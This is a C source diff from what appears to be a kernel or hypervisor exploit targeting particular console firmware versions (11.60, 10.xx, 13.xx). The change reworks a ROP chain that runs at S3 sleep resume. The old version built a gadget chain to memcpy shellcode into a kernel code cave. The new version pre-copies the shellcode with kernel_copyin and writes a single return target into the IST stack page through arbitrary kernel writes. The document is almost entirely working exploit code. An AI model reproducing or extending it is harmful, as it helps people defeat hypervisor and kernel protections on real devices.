@@ -507,23 +507,13 @@ static int arm_startup_carrier(uint64_t resume_cave) {
   return 0;
 }
 
-static int build_sx_rop(uint64_t ist, size_t shellcode_len) {
-  uint64_t rop[16] = {0};
-  uint64_t *p = rop;
-
-  /* The same transfer sequence as 13.xx. Its three UART debug writes use an
-   * OR [rcx],eax gadget that the 11.60 kernel does not have, so they are left
-   * out. */
-  *p++ = kg(env_offset.GAD_POP_RDI_RET);
-  *p++ = kg(env_offset.KERNEL_CODE_CAVE);
-  *p++ = kg(env_offset.GAD_POP_RSI_RET);
-  *p++ = kernel_cave_shellcode;
-  *p++ = kg(env_offset.GAD_POP_RDX_RET);
-  *p++ = shellcode_len;
-  *p++ = kg(env_offset.FUN_MEMCPY);
-  *p++ = kg(env_offset.KERNEL_CODE_CAVE);
-
-  kwrite(ist + 0x1000, rop, (size_t)((uint8_t *)p - (uint8_t *)rop));
+static int build_sx_rop(uint64_t ist) {
+  /* Shellcode is pre-copied to KERNEL_CODE_CAVE by hv_defeat_1160 before
+   * sleep. On 10.xx the kernel_cave_shellcode alias is in private SYSCORE
+   * page tables (below the 10.xx DMAP base), so a memcpy from that VA faults
+   * on the kernel CR3 active at S3 resume. Pre-copy avoids the dependency. */
+  uint64_t target = kg(env_offset.KERNEL_CODE_CAVE);
+  kwrite(ist + 0x1000, &target, sizeof(target));
   return 0;
 }
 
@@ -575,7 +565,12 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
    * staging took it and checked it, and the page under it, before it wrote
    * anything.  See take_sx_stack_page_1160. */
   sx_ist = pa_to_dmap(sx_stack_page_1160());
-  if (sx_ist == dmap || build_sx_rop(sx_ist, shellcode_kernel_len))
+  if (kernel_copyin(shellcode_kernel, kg(env_offset.KERNEL_CODE_CAVE),
+                    shellcode_kernel_len)) {
+    notify("11.60 could not pre-copy shellcode to cave\n");
+    return -1;
+  }
+  if (sx_ist == dmap || build_sx_rop(sx_ist))
     return -1;
 
   resume_cave = kg(env_offset.DATA_CAVE);
